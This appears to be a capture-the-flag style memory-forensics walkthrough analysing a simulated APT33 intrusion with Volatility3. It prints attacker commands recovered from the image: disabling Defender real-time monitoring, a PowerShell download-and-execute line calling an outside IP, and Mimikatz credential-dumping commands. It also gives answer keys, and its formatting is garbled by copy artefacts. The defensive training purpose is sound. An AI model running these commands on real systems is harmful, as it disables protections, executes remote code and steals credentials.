# 🛡️ APT33 -- Operation Cleaver: Memory Forensics & Incident Response Walkthrough

## 🧠 Overview

This exercise simulates a **targeted cyberattack by APT33 (Elfin)**
against a fictional energy company. The attacker chain includes:

-   Initial access via phishing\
-   Exploitation of a known Office vulnerability\
-   Malware delivery (PowerShell loader + RAT)\
-   Privilege escalation\
-   Credential access\
-   Lateral movement\
-   Persistence and likely data exfiltration

A **memory image** was acquired after detection. This step-by-step
walkthrough details how to analyze it to answer the incident response
questions and understand attacker behavior.

------------------------------------------------------------------------

## 🎭 Incident Scenario

**Incident Name:** `APT33 – Operation Cleaver`\
**Target:** Energy Sector Workstation\
**Threat Actor:** APT33 (Elfin -- Iranian cyberespionage group)

A targeted spear-phishing campaign was launched against a workstation in
the energy sector. The attacker delivered a disguised document file
which, once opened, executed a malicious macro designed to weaken the
system's defenses and stage further malicious activity.

This initial access allowed the attacker to download and execute a
secondary component from a remote server. The binary was saved locally
and configured to persist across reboots. Subsequent actions suggest
attempts to gain elevated privileges and establish communication with an
external server --- likely for remote control or further post-compromise
operations.

------------------------------------------------------------------------

## 🔧 Tools Required

-   [Volatility3](https://www.volatilityfoundation.org/)
-   Python 3.x
-   Strings / `xxd` / hash utilities (`sha256sum`)
-   Yara, VirusTotal (optional)
-   ProcDOT (optional for execution chain visualization)
-   HxD or any hex editor

------------------------------------------------------------------------

## 🔬 Step-by-Step Analysis

------------------------------------------------------------------------

### ❓ Q1. What was the first action taken to weaken the system's defenses?

#### 🎯 Objective

Identify what security feature was disabled by the attacker.

#### 🧪 Steps

\`\`\`bash python3 vol.py -f dump.raw windows.cmdline \> cmdline.txt
grep -i 'powershell' cmdline.txt Look for security-related commands. We
find:

powershell Copy Edit Set-MpPreference -DisableRealtimeMonitoring \$true
✅ Answer Set-MpPreference -DisableRealtimeMonitoring \$true

🧠 Analysis This disables Windows Defender's real-time protection --- a
classic first step to avoid detection.

❓ Q2. What CVE is associated with the malicious file delivered during
the initial phishing stage? 🎯 Objective Determine which vulnerability
was exploited through the weaponized document.

🧪 Steps Identify suspicious .png-named file from memory using:

bash Copy Edit volatility3 -f dump.raw windows.filescan \| grep -i png
Dump the file and check its magic bytes:

bash Copy Edit xxd file.png \| head Detect that it's actually a .docx
(ZIP format) -- magic bytes should be 50 4B 03 04.

Fix extension and extract macro using oledump.py.

Analyze macro --- confirm it triggers PowerShell code.

Extract hash and check on VirusTotal:

bash Copy Edit sha256sum malicious.docx VirusTotal confirms:
CVE-2017-11882

✅ Answer CVE-2017-11882

❓ Q3. What is the full URL used to retrieve the PowerShell payload? 🧪
Steps Extract PowerShell commands using:

bash Copy Edit volatility3 -f dump.raw windows.cmdline \| grep -i
'downloadstring' Macro includes:

powershell Copy Edit IEX (New-Object
Net.WebClient).DownloadString("http://185.234.1.56/malware.ps1") ✅
Answer http://185.234.1.56/malware.ps1

❓ Q4. What was the name of the final executable payload downloaded and
run on the system? 🧪 Steps Inspect PowerShell script (malware.ps1) ---
it drops:

powershell Copy Edit payload.exe Confirm presence in memory:

bash Copy Edit volatility3 -f dump.raw windows.filescan \| grep -i
payload.exe Optionally extract:

bash Copy Edit volatility3 -f dump.raw windows.dumpfiles --name
payload.exe ✅ Answer payload.exe

❓ Q5. What tool was used to perform credential dumping? 🧪 Steps Scan
for suspicious tools:

bash Copy Edit volatility3 -f dump.raw windows.pslist \| grep -i
mimikatz Inspect file handles:

bash Copy Edit volatility3 -f dump.raw windows.filescan \| grep -i
mimikatz Mimikatz is found in
C:`\Users`{=tex}`\analyst`{=tex}`\Documents`{=tex}`\mimikatz`{=tex}.

✅ Answer mimikatz.exe

❓ Q6. Which command within Mimikatz was used to extract credentials? 🧪
Steps Dump console input history:

bash Copy Edit volatility3 -f dump.raw windows.consoles Search for
command usage:

cpp Copy Edit privilege::debug sekurlsa::logonPasswords ✅ Answer cpp
Copy Edit privilege::debug\
sekurlsa::logonPasswords